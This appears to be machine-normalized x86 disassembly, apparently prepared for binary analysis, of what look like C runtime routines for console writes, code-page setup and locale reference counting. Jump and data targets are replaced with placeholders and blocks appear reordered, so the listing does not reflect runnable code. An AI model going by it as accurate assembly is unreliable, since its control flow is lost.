test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_405926
mov [ eax ] 0x1c
call sub_405939
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_40594c
pop ecx
jmp r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40c00c
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_40d61c
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_40cb0b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_40cb0b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_40d61c
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40b0be
push 0x10
push r--data
call sub_4082b0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_4082f5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40d556
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40a9c1
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b18a
mov eax [ ebp - 0x1c ]
sub_40b192
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_407e59
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40b1db
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_40b237
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_407e9e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_407e9e
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40b308
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40a6c4
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40b349
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40a6c4
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40b37b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40a5eb
pop ecx
pop ebp
retn
sub_40b3b7
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_40a5eb
pop ecx
pop ebp
retn
sub_40b3e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
pop ebp
retn
sub_40b40c
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40b43b
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_40a4d0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40b49f
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40d2e9
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_40d1bc
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_40d1bc
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_40a4d0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40b62f
push 0xc
push r--data
call sub_4082b0
call sub_406b90
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b6ca
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_4082f5
retn
push 0x20
call sub_40828a
cmp esi rw-data
je r-xdata
push esi
call sub_405655
pop ecx
sub_40b6d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_405cbc
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40b74f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40b6d3
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40b43b
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40a4d0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40b40c
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_40b49f
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_40a4d0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40b40c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40b938
push 0x14
push r--data
call sub_4082b0
or [ ebp - 0x20 ] 0xffffffff
call sub_406b90
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40b62f
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40b6d3
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_407e59
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_4082f5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40b74f
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_405926
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_405655
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_405655
pop ecx
push 0xd
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ba99
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_405655
pop ecx
sub_40baf0
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_40bb7f
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_40bc18
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_405655
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_405655
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_405655
push [ esi + 0xc0 ]
call sub_405655
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_40d8ba
push [ esi + 0xd4 ]
call sub_405655
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_405655
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_405655
pop ecx
push [ esi + 0xb0 ]
call sub_405655
push [ esi + 0xbc ]
call sub_405655
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_405655
push [ esi + 0xbc ]
call sub_40dc9a
pop ecx
pop ecx
push eax
call sub_405655
pop ecx
push eax
call sub_405655
push [ esi + 0xbc ]
call sub_40dc31
